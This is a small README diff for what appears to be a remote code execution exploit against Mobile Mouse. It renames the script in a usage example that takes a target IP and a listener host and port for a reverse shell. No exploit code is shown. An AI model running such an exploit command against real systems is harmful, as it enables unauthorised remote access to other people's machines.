@@ -49,7 +49,7 @@ Added command-line arguments to specify:
 
 ### Basic Usage
 ```bash
-python3 exploit.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>
+python3 mobile-mouse-rce.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>
 ```
 
 This will:
